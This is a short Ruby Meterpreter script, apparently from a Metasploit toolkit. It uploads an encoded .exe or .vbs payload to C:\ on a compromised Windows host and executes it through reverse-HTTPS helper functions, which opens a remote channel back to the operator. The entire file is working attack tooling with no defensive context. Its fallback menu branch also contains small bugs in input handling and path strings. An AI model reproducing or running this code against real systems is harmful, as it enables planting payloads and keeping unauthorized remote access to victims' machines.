def dynamic_require path
    $".delete path if $".include? path
    require path
end

reverse_https_api_path = "#{ENV[:BASE]}/msf3/scripts/meterpreter/reverse-https-api.rb"
dynamic_require reverse_https_api_path

#datei wohin kopieren ?
src = ""
if args[0]
  src = args[0] 
else
    print_error "No encoded Payload specified"
    raise Rex::Script::Completed
end

filename = src.split('/').last
system_path = "c:\\#{filename}"

stat = ::File.stat(src)

if stat.file?
  client.fs.file.upload system_path, args[0]
else
  print_error "Source doesn't exists"
end
if args[0].include? ".exe"
    print_status "Found .exe as Payload"
    exe_reverse_https system_path, client
elsif args[0].include? ".vbs"
    print_status "Found .vbs as Payload"
    vbs_reverse_https system_path, client
else
    print_status "c - Treat as Executable"
    print_status "w - run with wscript"
    print_status "e - to Exit the Scrit"
    input = STDIN.gets
    case input
    when "c"
      print_status "Try to execute"      
      exe_reverse_https "c:\#{filename}"
    when "w"
      print_status "Running wscript"      
      vbs_reverse_https "c:\#{filename}"
    when "e"
      raise Rex::Script::Completed 
    end
end    
